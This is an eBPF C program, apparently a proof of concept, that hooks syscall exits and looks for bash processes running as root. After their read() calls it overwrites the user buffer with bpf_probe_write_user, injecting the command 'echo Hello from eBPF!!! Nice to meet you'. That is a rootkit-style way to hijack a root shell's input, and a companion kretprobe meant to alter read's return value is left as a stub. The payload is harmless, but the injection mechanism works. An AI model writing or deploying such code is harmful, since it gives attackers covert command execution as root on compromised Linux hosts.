// hbash.bpf.c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <linux/sched.h>

#include <stdint.h>

#include <linux/ptrace.h>
#include <asm/unistd_64.h>


// #include <linux/syscalls.h>

#define TASK_COMM_LEN 16

char LICENSE[] SEC("license") = "GPL";


// The key will be 0, and the value will be the file descriptor
// struct {
//     __uint(type, BPF_MAP_TYPE_ARRAY);
//     __uint(max_entries, 1);
//     __type(key, int);
//     __type(value, int);
// } fd_map SEC(".maps");

int is_bash_with_root(struct pt_regs *ctx)
{
    char comm[TASK_COMM_LEN];
    
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // check if bash
    if(__builtin_memcmp(comm, "bash", 4) == 0) {
        
        // Get the current user and group IDs
        unsigned long long uid_gid = bpf_get_current_uid_gid();
        
        // UID is in lower 32 bits
        uint32_t uid = (uint32_t)uid_gid;
        
        bpf_printk("Bash found, COMM=> %s uid=> %u\n", comm, uid);
        
        // if bash is in root
        if(uid==0)
        {
            bpf_printk("\nROOOOOOOOOT\n");
            return 1;
        }
    }
    return 0;
}

// void save_target_bash_fd(int ret_fd) 
// {
//     // Store the file descriptor in the map
//     int key = 0;
//     long ret = bpf_map_update_elem(&fd_map, &key, &ret_fd, BPF_ANY);
    
//     if (ret != 0) 
//     {
//         bpf_printk("Failed to update map: %d\n", ret);
//     }
// }


SEC("raw_tracepoint/sys_exit")
int tp_exit(struct bpf_raw_tracepoint_args *ctx)
{
    struct pt_regs *regs = (struct pt_regs *)ctx->args[0];

    // Get the syscall number from the regs struct
    // long syscall_nr = BPF_CORE_READ(regs, orig_rax);

    // READ SAFELY!!!
    unsigned long syscall_nr;   // syscall no.
    bpf_probe_read(&syscall_nr, sizeof(syscall_nr), &regs->orig_rax);
    
    // If syscall is read and process is bash with root uid
    if (syscall_nr == __NR_read && is_bash_with_root(ctx)) 
    {
        int fd;
        bpf_probe_read(&fd, sizeof(fd), &regs->rdi);

        bpf_printk("from tp_exit=> Found bash in root with openat, file descriptor=> %d syscall_nr=> %d\n", fd,syscall_nr);

        int read_bytes = 0;
        bpf_probe_read(&read_bytes, sizeof(read_bytes), &regs->rax);

        // We only proceed if read() actually returned some bytes.
        if (read_bytes <= 0) {
            goto exit;
        }

        char *buffer = NULL;
        bpf_probe_read(&buffer , sizeof(buffer) , &regs->rsi);

        char newcommand[] = "echo Hello from eBPF!!! Nice to meet you";

        int ret = -999;
        
        if(read_bytes > sizeof(newcommand))
        {
            ret = bpf_probe_write_user((char *)(buffer), newcommand, sizeof(newcommand));
        }
        
        // Ensure the file descriptor is valid (>= 0)
        // if (fd >= 0) 
        // {
            // bpf_printk("from tp_exit=> Found bash in root with openat, file descriptor=> %d syscall_nr=> %d\n", fd,syscall_nr);

            // save_target_bash_fd(fd);
        // }
    }

exit:
    // bpf_printk("handling exit...");
    return 0;
}

int should_modify_return(struct pt_regs *ctx)
{
    return 1;
}

SEC("kretprobe/__x64_sys_read")
int modify_read_size(struct pt_regs *ctx)
{
    if(should_modify_return(ctx))
    {
        // logic to be implemented
    }

    return 0;
}
